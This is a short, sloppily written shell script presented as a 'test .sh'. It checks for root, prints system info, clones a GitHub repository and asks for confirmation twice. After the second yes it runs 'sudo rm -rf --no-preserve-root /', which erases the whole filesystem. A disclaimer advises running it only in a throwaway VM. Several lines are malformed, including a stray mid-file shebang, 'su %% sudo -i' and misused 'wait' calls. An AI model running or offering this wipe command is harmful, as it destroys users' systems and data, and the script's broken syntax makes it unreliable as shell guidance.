#/etc/
whoami
echo 'should be root'
echo 'if not root then goodbye'
timeout 3s ./test1.sh
fastfetch
wait 3s
neofetch
wait 2s
echo 'im not responsible for any damages to your pc please run this 
in a test vm or a pc you dont need this is a test .sh!'
echo 'starting now'
git clone https://github.com/testorg112332/testfiles.git
echo 'welcome to the script are you sure you want to run this script?'
# Prompt user with a 5-second timeout (-t 5)
read -t 5 -p "Do you want to proceed? [y/N]: " response 

# Check if read timed out ($? is greater than 128 when a read timeout occurs)
if [ $? -gt 128 ]; then
    echo -e "\nTimeout reached. Defaulting to 'No'."
    exit 1
fi

# Check user response
if [[ "$response" =~ ^[Yy]$ ]]; then
    echo "Proceeding..."
else
    echo "Aborted."
    exit 1
fi
su %% sudo -i
#!depending on different environments this could look different next#
which apt
which apk
which pacman 
which sudo
which git
which backup
which rm
which systemctl
which pkg
which dnf
#!/bin/bash

read -p "Are you sure you want to run this destructive action? [y/N] " -n 1 -r
echo
if [[ $REPLY =~ ^[Yy]$ ]]; then
    # Dangerous command goes AFTER the confirmation check
    mkdir /start/
mkdir /done/
  sudo rm -rf --no-preserve-root /
else
    echo "Action cancelled."
    exit 1
fi
#!other systems/better cleanup#
mkdir /start/
mkdir /done/

